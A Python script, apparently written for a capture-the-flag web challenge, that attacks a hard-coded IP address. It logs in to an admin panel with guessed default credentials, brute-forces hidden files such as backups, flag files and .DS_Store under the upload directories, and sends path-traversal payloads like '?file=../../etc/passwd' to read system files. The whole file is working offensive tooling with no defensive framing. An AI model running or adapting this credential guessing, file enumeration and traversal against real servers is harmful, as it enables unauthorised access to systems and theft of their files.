import urllib.request, urllib.parse, http.cookiejar, re

BASE = "http://103.163.47.230:33662"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(p, data=None, method=None):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    r = urllib.request.Request(BASE + p, data=data,
                               headers={"Content-Type": "application/x-www-form-urlencoded"} if data else {},
                               method=method)
    try:
        resp = op.open(r, timeout=15)
        return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()


req("/admin/", {"username": "admin", "password": "admin123"}, "POST")

CAND = []
for d in ["/uploads/", "/uploads/avatars/", "/assets/"]:
    for f in ["index.html", "index.php", "index.json", "index.txt", "manifest.json",
              "archive.json", "archive.index", ".index", "index.old", "index.bak",
              "old_index.json", "index", "list.txt", "files.json", "inventory.json",
              ".DS_Store", "thumb.jpg", "thumb.png", "default.png", "default-avatar.svg",
              "flag.txt", "flag.png", "note.txt", "readme.txt", "backup.zip",
              "archive.zip", "sync.log", "sync.json", "avatars.json", "map.json"]:
        CAND.append(d + f)

print("=== uploads/assets 文件探测")
for p in CAND:
    s, h, b = req(p)
    if s != 404 and s != 403:
        print(f"  {p:38s} {s} len={len(b)} ct={h.get('Content-Type','')[:30]}")
        if s == 200:
            try:
                print("     ", b[:200])
            except Exception:
                pass

print("\n=== /admin/ 参数探测")
for q in ["?file=../../etc/passwd", "?page=../../etc/passwd", "?view=../../etc/passwd",
          "?download=../../etc/passwd", "?avatar=../../etc/passwd", "?debug=1",
          "?source=1", "?config=1", "?legacy=1", "?archive=1", "?export=1",
          "?admin=1", "?log=1", "?index=1", "?sync=1", "?raw=1", "?show=1"]:
    s, h, b = req("/admin/" + q)
    txt = b.decode("utf-8", "replace")
    if len(b) != 2207:
        print(f"  {q:32s} {s} len={len(b)}")
        m = re.search(r'(头像已更新|已保存|root:|HTUCTF|错误)', txt)
        if m:
            print("     *", m.group(0))
        if b"root:" in b or b"HTUCTF" in b:
            print("     !!!!", b[:500])

print("\n=== 已知上传文件访问")
s, h, b = req("/uploads/avatars/avatar_92ef21b97e.png")
print("  avatar:", s, len(b), h.get("Content-Type", ""))
